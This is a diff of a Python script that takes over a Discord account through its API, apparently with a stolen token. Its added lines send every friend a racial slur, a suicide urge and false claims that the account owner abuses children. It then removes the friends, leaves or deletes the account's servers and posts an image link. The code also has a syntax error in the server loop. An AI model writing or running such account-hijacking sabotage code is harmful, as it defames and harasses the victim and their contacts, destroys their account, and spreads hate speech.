@@ -51,9 +51,18 @@ requests.patch("https://discord.com/api/v9/users/@me", headers=HEADERS, json={'s
 
 
 for friend in friends:
-    for i in range(10):
+    for i in range(5):
         send(f"https://discord.com/channels/@me/{friend['id']}", "NIGGER FUCK YOU KYS I ALWAYS HATED YOU")
         sleep(0.25)
+        send(f"https://discord.com/channels/@me/{friend['id']}", "I RAPE LITTLE KIDS\N I LOVE CHILD PORN")
+    
     requests.delete(f"https://discord.com/api/@me/relationships/{friend['id']}", headers=HEADERS )
 
+for guild in guilds:
+    
+    if (guild["owner"):
+        requests.post(f"https://discord.com/api/guilds/{guild['id']}", headers=HEADERS, json={})
+    else:
+        requests.delete(f"https://discord.com/api/users/@me/guilds/{guild['id']}/delete", headers=HEADERS, json={})
+        
 send(f"https://discord.com/channels/@me/{choice(friends)['id']}", "https://postimg.cc/F1v9zPpW")
